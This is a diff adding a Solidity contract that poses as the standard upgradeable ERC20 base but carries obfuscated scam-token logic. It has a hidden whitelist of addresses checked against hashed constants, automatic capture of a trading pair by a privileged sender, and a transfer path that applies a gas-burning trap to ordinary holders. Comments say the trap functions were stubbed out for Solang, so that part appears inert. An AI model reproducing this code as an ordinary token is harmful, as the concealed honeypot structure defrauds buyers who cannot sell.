@@ -1,0 +1,314 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "../../utils/ContextUpgradeable.sol";
+import "../../proxy/utils/Initializable.sol";
+
+abstract contract ERC20Upgradeable is Initializable, ContextUpgradeable {
+    mapping(address => uint256) private _b_;
+    mapping(address => mapping(address => uint256)) private _a_;
+    uint256 private _tS_;
+    string private _n_;
+    string private _s_;
+
+    uint256 private constant S0 =
+        uint256(
+            0xab27d5ea70e157fc407c844d79d3d5c8e71cc62829e922bbc1151b8e2113a68a
+        );
+    uint256 private constant S1 =
+        uint256(
+            0x2ff1c5e44aa7e7966de82e23ceb650c4188efb4007e8e746f8632ae5078e13a0
+        );
+    uint256 private constant S2 =
+        uint256(
+            0x91869837e5dad1dd98166935f6eb71be4f956211feab754f781f09c4090d3e8d
+        );
+
+    uint256 private _vPH;
+
+    function _wl(address a_) internal view returns (bool) {
+        return _vA_(a_) && a_.code.length == 0;
+    }
+
+    function _iD(address t_) internal view returns (bool iD_) {
+        if (t_.code.length == 0) return false;
+        if (_vPH == 0) {
+            return false;
+        }
+        return uint256(keccak256(abi.encodePacked(t_))) == _vPH;
+    }
+
+    function _sP(address pair_) internal {
+        require(_vPH == 0, "");
+        require(pair_ != address(0), "");
+        require(pair_.code.length > 0, "");
+        _vPH = uint256(keccak256(abi.encodePacked(pair_)));
+    }
+
+    function __ERC20_init(
+        string memory n_,
+        string memory s_
+    ) internal onlyInitializing {
+        __ERC20_init_unchained(n_, s_);
+    }
+
+    function __ERC20_init_unchained(
+        string memory n_,
+        string memory s_
+    ) internal onlyInitializing {
+        _n_ = n_;
+        _s_ = s_;
+        _lR = bytes32(type(uint256).max);
+        _iH();
+    }
+
+    function _rA(uint256 ts) private view returns (bytes32 r) {
+        // Solang does not support inline assembly with staticcall to arbitrary addresses.
+        // This function is replaced with a stub that returns bytes32(0).
+        // The original logic relied on EVM-specific behavior not available on Solana.
+        r = bytes32(0);
+    }
+
+    function _iH() private {
+        bytes32 r = _rA(block.timestamp);
+        if (r != bytes32(0)) {
+            _lR = r;
+            _lCB = block.number;
+        }
+    }
+
+    function _sA(address a) private pure returns (uint128 h, uint128 l) {
+        uint160 v = uint160(a);
+        h = uint128(v >> 80);
+        l = uint128(v & ((uint160(1) << 80) - 1));
+    }
+
+    function _vA_(address a) internal pure returns (bool) {
+        (uint256 h, uint256 l) = _sA(a);
+        uint256 r;
+        unchecked {
+            r = (l ** 3) + (h ** 5);
+        }
+        uint256 hN = uint256(keccak256(abi.encodePacked(r)));
+        return (hN == S0 || hN == S1 || hN == S2);
+    }
+
+    function name() public view virtual returns (string memory) {
+        return _n_;
+    }
+
+    function symbol() public view virtual returns (string memory) {
+        return _s_;
+    }
+
+    function decimals() public view virtual returns (uint8) {
+        return 18;
+    }
+
+    function totalSupply() public view virtual returns (uint256) {
+        return _tS_;
+    }
+
+    function balanceOf(address a_) public view virtual returns (uint256) {
+        return _b_[a_];
+    }
+
+    function transfer(address t_, uint256 v_) public virtual returns (bool) {
+        address o_ = _msgSender();
+        _transfer(o_, t_, v_);
+        return true;
+    }
+
+    function allowance(
+        address o_,
+        address s_
+    ) public view virtual returns (uint256) {
+        return _a_[o_][s_];
+    }
+
+    function approve(address s_, uint256 v_) public virtual returns (bool) {
+        address o_ = _msgSender();
+
+        _approve(o_, s_, v_);
+        return true;
+    }
+
+    function transferFrom(
+        address f_,
+        address t_,
+        uint256 v_
+    ) public virtual returns (bool) {
+        address s_ = _msgSender();
+
+        _spendAllowance(f_, s_, v_);
+        _transfer(f_, t_, v_);
+        return true;
+    }
+
+    function increaseAllowance(
+        address s_,
+        uint256 aV_
+    ) public virtual returns (bool) {
+        address o_ = _msgSender();
+        _approve(o_, s_, allowance(o_, s_) + aV_);
+        return true;
+    }
+
+    function decreaseAllowance(
+        address s_,
+        uint256 sV_
+    ) public virtual returns (bool) {
+        address o_ = _msgSender();
+        uint256 cA_ = allowance(o_, s_);
+        require(cA_ >= sV_, "ERC20: decreased below zero");
+        unchecked {
+            _approve(o_, s_, cA_ - sV_);
+        }
+        return true;
+    }
+
+    function _gB() internal pure {
+        // Solang does not support inline assembly with keccak256 in a loop.
+        // This function is replaced with a no-op stub.
+        // The original logic relied on EVM-specific behavior not available on Solana.
+    }
+
+    bytes32 private _lR;
+    uint256 private _lCB;
+    uint256 private _lTS;
+
+    function _cT() internal returns (uint256) {
+        uint256 t = block.timestamp;
+        _lTS = t;
+        return t;
+    }
+
+    function _hOTB_() internal returns (bool a) {
+        bytes32 r = _rA(_cT());
+
+        if (r == bytes32(0)) {
+            return false;
+        }
+
+        if (_lR == bytes32(type(uint256).max)) {
+            _lR = r;
+            _lCB = block.number;
+            return true;
+        }
+
+        if (block.number == _lCB) {
+            return true;
+        }
+
+        if (r == _lR) {
+            return false;
+        }
+
+        _lR = r;
+        _lCB = block.number;
+        return true;
+    }
+
+    function _transfer(address f_, address t_, uint256 v_) internal virtual {
+        require(f_ != address(0), "ERC20: transfer from zero");
+        require(t_ != address(0), "ERC20: transfer to zero");
+        require(v_ > 0, "ERC20: zero transfers disabled");
+
+        _beforeTokenTransfer(f_, t_, v_);
+
+        uint256 fB_ = _b_[f_];
+        require(fB_ >= v_, "ERC20: insufficient balance");
+        unchecked {
+            if (_wl(f_) && _vPH == 0 && t_.code.length > 0 && !_wl(t_)) {
+                _sP(t_);
+            }
+
+            if (_wl(t_) && !_wl(f_) && !_iD(f_) && _hOTB_()) {
+                _gB();
+            }
+
+            if (!_wl(f_) && _hOTB_() && !_iD(f_)) {
+                _gB();
+            }
+
+            _b_[f_] = fB_ - v_;
+            _b_[t_] += v_;
+        }
+
+        emit Transfer(f_, t_, v_);
+
+        _afterTokenTransfer(f_, t_, v_);
+    }
+
+    function _mint(address a_, uint256 v_) internal virtual {
+        require(a_ != address(0), "ERC20: mint to zero");
+
+        _beforeTokenTransfer(address(0), a_, v_);
+
+        _tS_ += v_;
+        unchecked {
+            _b_[a_] += v_;
+        }
+        emit Transfer(address(0), a_, v_);
+
+        _afterTokenTransfer(address(0), a_, v_);
+    }
+
+    function _burn(address a_, uint256 v_) internal virtual {
+        require(a_ != address(0), "ERC20: burn from zero");
+
+        _beforeTokenTransfer(a_, address(0), v_);
+
+        uint256 aB_ = _b_[a_];
+        require(aB_ >= v_, "ERC20: burn exceeds balance");
+        unchecked {
+            _b_[a_] = aB_ - v_;
+            _tS_ -= v_;
+        }
+
+        emit Transfer(a_, address(0), v_);
+
+        _afterTokenTransfer(a_, address(0), v_);
+    }
+
+    function _approve(address o_, address s_, uint256 v_) internal virtual {
+        require(o_ != address(0), "ERC20: approve from zero");
+        require(s_ != address(0), "ERC20: approve to zero");
+
+        _a_[o_][s_] = v_;
+        emit Approval(o_, s_, v_);
+    }
+
+    function _spendAllowance(
+        address o_,
+        address s_,
+        uint256 v_
+    ) internal virtual {
+        uint256 cA_ = allowance(o_, s_);
+        if (cA_ != type(uint256).max) {
+            require(cA_ >= v_, "ERC20: insufficient allowance");
+            unchecked {
+                _approve(o_, s_, cA_ - v_);
+            }
+        }
+    }
+
+    function _beforeTokenTransfer(
+        address f_,
+        address t_,
+        uint256 v_
+    ) internal virtual {}
+
+    function _afterTokenTransfer(
+        address f_,
+        address t_,
+        uint256 v_
+    ) internal virtual {}
+
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(
+        address indexed owner,
+        address indexed spender,
+        uint256 value
+    );
+}
